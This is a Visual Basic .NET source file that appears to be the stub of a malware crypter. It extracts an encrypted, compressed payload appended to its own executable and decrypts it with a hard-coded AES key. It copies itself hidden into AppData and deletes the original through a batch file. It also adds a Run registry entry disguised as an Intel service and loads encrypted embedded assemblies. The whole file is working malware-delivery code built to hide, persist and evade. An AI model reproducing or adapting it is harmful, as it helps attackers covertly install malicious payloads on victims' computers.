Public Class Main

    Public Shared Function DoShit(ByVal AppPath As String, ByVal AppDirectory As String)
        Dim Antis As Boolean = False

        Dim Payload() As Byte = GetPload(AppPath)
        Dim i As Integer = FindSplit(Payload)
        Dim Start As Integer = i
        If Payload(Start - 10) = &H54 Then
            'nti's
            Antis = True
        End If

        If Payload(Start - 14) = &H54 Then
            'copy self
            Dim TmpPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            If AppPath.ToLower.Contains(TmpPath.ToLower) Then
            Else
                Dim AppName As String = Strings.Right(AppPath, (AppPath.ToString.Length - AppPath.LastIndexOf("\")))

                'copy our self to temp and re execute
                Try
                    FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)

                Catch ex As Exception
                    Try
                        FileIO.FileSystem.DeleteFile(TmpPath & AppName)
                        FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)

                    Catch exx As Exception
                        Process.GetCurrentProcess.Kill()
                    End Try
                End Try


                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.Hidden)
                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.System)
                Process.Start(TmpPath & AppName)
                'melt
                If Payload(Start - 12) = &H54 Then
                    FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & AppPath & """" & Environment.NewLine & "del a.bat", False)
                    Dim startInfo As New ProcessStartInfo("a.bat")
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(startInfo)
                    Process.GetCurrentProcess.Kill()
                Else
                    Process.GetCurrentProcess.Kill()
                End If

            End If
        End If

        'check if auto startup
        If Payload(Start - 8) = &H54 Then
            startup(AppPath)
        End If

        Dim NewByts() As Byte = RedimPload(Payload, Start)
        NewByts = Loop1(NewByts, Payload, Start)
        NewByts = Loop2(NewByts)
        Dim F As Tuple(Of Byte(), Boolean)
        F.Item1 = AES_Decrypt(Decompress(NewByts))
        F.Item2 = False
        Return F
    End Function

    Shared Function RedimPload(ByVal Payload() As Byte, Start As Integer) As Byte()
        Dim NewByts(0 To (Payload.Length - Start) - 1) As Byte
        Return NewByts
    End Function

    Shared Function GetPload(ByVal AppPath As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(AppPath)
    End Function

    Shared Function Loop2(ByVal NewByts() As Byte) As Byte()
        Dim Tmp() As Byte = NewByts
        Dim I As Integer = FindSplit(NewByts) - 7
        ReDim NewByts(0 To I)
        For I = 0 To NewByts.Length - 1
            NewByts(I) = Tmp(I)
        Next
        Return NewByts
    End Function

    Shared Function Loop1(ByVal NewByts() As Byte, ByVal Payload() As Byte, ByVal Start As Integer) As Byte()
        For i As Integer = 0 To NewByts.Length - 1
            NewByts(i) = Payload(Start + i)
        Next
        Return NewByts
    End Function

    Shared Sub startup(ByVal AppPath As String)
        Dim regKey As Microsoft.Win32.RegistryKey
        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        regKey.SetValue("Intel(R) Dynamic Platform and Thermal Framework LPM Policy Service Helper", """" & AppPath & """")
        regKey.Close()
    End Sub
    Shared Function FindSplit(ByVal Payload() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim I As Integer = 0
        For Each bytez As Byte In Payload
            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If bytez = &H40 Then
                            Found3 = True
                        Else
                            Found1 = False
                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                Else
                                    Found4 = False
                                    Found3 = False
                                    Found2 = False
                                    Found1 = False
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            I += 1
        Next
        Return I + 1
    End Function

    Public Shared Function Decompress(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
        Dim buffer = New Byte(4095) {}
        While True
            Dim size = zipStream.Read(buffer, 0, buffer.Length)
            If size > 0 Then
                stream.Write(buffer, 0, size)
            Else
                Exit While
            End If
        End While
        zipStream.Close()
        Return stream.ToArray()
    End Function



    Public Shared _initialized As Boolean
    Shared Sub EnsureInitialized()
        If Not _initialized Then
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
    End Sub
    Private Shared Function AES_Decrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        'get the root namespace (im tired of manually adding this)
        Dim asm As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly
        Dim RootNamespace As String = Strings.Left(asm.EntryPoint.DeclaringType.Namespace, asm.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        'fuck ya! Im done manually adding that shit!!!
        Dim resourceName As String = RootNamespace + New Reflection.AssemblyName(args.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)

            Dim assemblyData = New Byte(stream.Length - 1) {}
            'decode assembly here

            stream.Read(assemblyData, 0, assemblyData.Length)
            assemblyData = AES_Decrypt(Decompress(assemblyData))
            Return Reflection.Assembly.Load(assemblyData)

        End Using ' stream
    End Function
End Class

Public Class Tuple(Of T1, T2)
    Public Property Item1() As T1
        Get
            Return m_Item1
        End Get
        Set
            m_Item1 = Value
        End Set
    End Property
    Private m_Item1 As T1
    Public Property Item2() As T2
        Get
            Return m_Item2
        End Get
        Set
            m_Item2 = Value
        End Set
    End Property
    Private m_Item2 As T2


    Public Sub New(Item1 As T1, Item2 As T2)
        Me.Item1 = Item1
        Me.Item2 = Item2
    End Sub
End Class